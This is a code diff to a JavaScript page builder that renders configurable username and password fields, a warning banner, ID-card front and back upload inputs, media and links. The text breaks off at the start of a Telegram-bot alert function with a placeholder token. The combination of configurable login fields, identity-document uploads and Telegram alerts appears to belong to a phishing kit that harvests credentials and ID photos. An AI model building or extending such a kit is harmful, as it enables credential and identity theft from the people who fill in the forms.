@@ -213,7 +213,7 @@ function loadBackgroundFromForm(cfg){
 }
 
 /* RENDER (ORIGINAL LOGIC UNCHANGED) */
-function renderForm(){
+function renderForm() {
   $("formTitle").innerText = formConfig.title || "";
   $("formTitle").style.color = formConfig.titleColor || "#000";
 
@@ -225,6 +225,7 @@ function renderForm(){
   embedEl.innerHTML = "";
   failureWarning.innerText = "";
 
+  // Avatar & Logo
   if(formConfig.avatarURL){
     imageContainer.innerHTML += `<img src="${formConfig.avatarURL}" style="width:90px;border-radius:50%">`;
   }
@@ -232,10 +233,12 @@ function renderForm(){
     imageContainer.innerHTML += `<img src="${formConfig.logoURL}">`;
   }
 
+  // Warning
   if(formConfig.enableWarning && formConfig.warning){
     failureWarning.innerText = formConfig.warning;
   }
 
+  // Username & Password
   if(formConfig.addAuth && formConfig.usernamePlaceholder && formConfig.passwordPlaceholder){
     formEl.innerHTML += `
       <input name="username" placeholder="${formConfig.usernamePlaceholder}" required>
@@ -243,36 +246,142 @@ function renderForm(){
     `;
   }
 
+  // Extra Fields
   if(Array.isArray(formConfig.extraFields)){
     formConfig.extraFields.filter(f=>f?.trim()).forEach(f=>{
       formEl.innerHTML += `<input name="${f}" placeholder="${f}" required>`;
     });
   }
 
+  // -----------------------
+  // ID Upload Section
+  // -----------------------
+  if(formConfig.idFrontChk || formConfig.idBackChk){
+    const idBox = document.createElement("div");
+    idBox.style.background = formConfig.idSectionBg || "#f7f9fc";
+    idBox.style.padding = "10px";
+    idBox.style.borderRadius = "8px";
+    idBox.style.marginBottom = "8px";
+
+    if(formConfig.idFrontChk){
+      const frontLabel = document.createElement("label");
+      frontLabel.textContent = formConfig.idFrontText || "Upload ID Front";
+      const frontInput = document.createElement("input");
+      frontInput.type = "file";
+      frontInput.name = "idFront";
+      idBox.appendChild(frontLabel);
+      idBox.appendChild(frontInput);
+    }
+
+    if(formConfig.idBackChk){
+      const backLabel = document.createElement("label");
+      backLabel.textContent = formConfig.idBackText || "Upload ID Back";
+      const backInput = document.createElement("input");
+      backInput.type = "file";
+      backInput.name = "idBack";
+      idBox.appendChild(backLabel);
+      idBox.appendChild(backInput);
+    }
+
+    formEl.appendChild(idBox);
+  }
+
+  // -----------------------
+  // Custom Fields
+  // -----------------------
+  if(Array.isArray(formConfig.customFields)){
+    formConfig.customFields.forEach(fld=>{
+      const wrapper = document.createElement("div");
+      wrapper.style.marginBottom = "8px";
+      const input = document.createElement("input");
+      input.type = fld.type || "text";
+      input.name = fld.label || "field";
+      input.placeholder = fld.label || "Field";
+      wrapper.appendChild(input);
+      formEl.appendChild(wrapper);
+    });
+  }
+
+  // -----------------------
+  // Gallery Items (Image + Link + Description)
+  // -----------------------
+  if(Array.isArray(formConfig.galleryItems)){
+    formConfig.galleryItems.forEach(g=>{
+      if(!g.img) return;
+      const div = document.createElement("div");
+      div.style.marginBottom = "8px";
+      div.innerHTML = `<a href="${g.link||'#'}" target="_blank"><img src="${g.img}" style="width:100%;border-radius:6px;margin:6px 0;"></a>`;
+      if(g.desc) div.innerHTML += `<small>${g.desc}</small>`;
+      formEl.appendChild(div);
+    });
+  }
+
+  // -----------------------
+  // Videos
+  // -----------------------
+  if(formConfig.videoLinks){
+    formConfig.videoLinks.split(",").forEach(link=>{
+      link = link.trim();
+      if(!link) return;
+
+      let videoEl;
+      if(link.endsWith(".mp4") || link.endsWith(".webm")){
+        videoEl = document.createElement("video");
+        videoEl.src = link;
+        videoEl.controls = true;
+        videoEl.style.width = "100%";
+        videoEl.style.borderRadius = "6px";
+        videoEl.style.margin = "6px 0";
+      } else {
+        const videoId = link.split("v=")[1]?.split("&")[0];
+        if(videoId){
+          videoEl = document.createElement("iframe");
+          videoEl.src = `https://www.youtube.com/embed/${videoId}`;
+          videoEl.width = "100%";
+          videoEl.height = "315";
+          videoEl.frameBorder = "0";
+          videoEl.allow = "accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture";
+          videoEl.allowFullscreen = true;
+          videoEl.style.margin = "6px 0";
+        }
+      }
+
+      if(videoEl) formEl.appendChild(videoEl);
+    });
+  }
+
+  // -----------------------
+  // Main Button
+  // -----------------------
   if(formConfig.showMainBtn && formConfig.buttonText){
     const btn = document.createElement("button");
     btn.textContent = formConfig.buttonText;
     btn.style.background = formConfig.btnColor || "#1976d2";
+    btn.style.color = "#fff";
     btn.onclick = submitForm;
     formEl.appendChild(btn);
   }
 
+  // -----------------------
+  // Embed Links
+  // -----------------------
   if(Array.isArray(formConfig.embedLinks)){
     formConfig.embedLinks.forEach(l=>{
       if(!l?.show || !l.url) return;
-      embedEl.innerHTML += `
-        <div class="embedLink">
-          <strong>${l.text || ""}</strong><br>
-          <a href="${l.url}" target="_blank">${l.url}</a>
-          ${l.desc ? `<br><small>${l.desc}</small>` : ""}
-        </div>
-      `;
+      const div = document.createElement("div");
+      div.className = "embedLink";
+      div.innerHTML = `<strong>${l.text || ""}</strong><br><a href="${l.url}" target="_blank">${l.url}</a>`;
+      if(l.desc) div.innerHTML += `<br><small>${l.desc}</small>`;
+      embedEl.appendChild(div);
     });
   }
 
-  /* APPLY BACKGROUND AFTER RENDER (ADDED) */
+  // -----------------------
+  // Background
+  // -----------------------
   loadBackgroundFromForm(formConfig);
 }
+
 /* TELEGRAM ALERT */
 function sendTelegramAlert(data){
   const BOT_TOKEN = "YOUR_BOT_TOKEN";
